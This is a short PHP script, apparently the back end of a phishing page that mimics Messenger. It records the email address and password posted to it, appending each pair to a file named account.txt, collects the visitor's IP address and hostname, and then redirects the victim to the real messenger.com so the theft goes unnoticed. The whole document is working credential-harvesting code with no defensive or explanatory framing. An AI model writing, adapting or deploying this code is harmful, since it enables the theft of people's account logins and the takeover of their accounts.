<?php


$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= $_POST['email'].":";
$message .= $_POST['pass']."\n";
$rnessage = "$message\n";
$file = fopen("account.txt","ab");
fwrite($file,$message);
fclose($file);


header("Location: https://www.messenger.com");


?>